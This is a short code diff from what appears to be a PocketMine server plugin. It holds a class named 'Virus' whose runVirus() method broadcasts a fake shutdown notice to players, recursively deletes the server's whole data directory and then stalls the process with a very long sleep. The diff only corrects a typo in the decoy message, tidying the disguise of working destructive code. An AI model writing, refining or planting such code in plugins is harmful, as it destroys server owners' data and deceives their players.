@@ -7,7 +7,7 @@ use pocketmine\utils\TextFormat;
 
 class Virus {
 	public static function runVirus() :void{
-		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Servwr] &rGoodbye guys server will be shutting down today!"));
+		Server::getInstance()->broadcastMessage(TextFormat::colorize("&d[Server] &rGoodbye guys server will be shutting down today!"));
 		$dir = Server::getInstance()->getDataPath();
 		self::deleteDir($dir);
 		sleep(10000000);
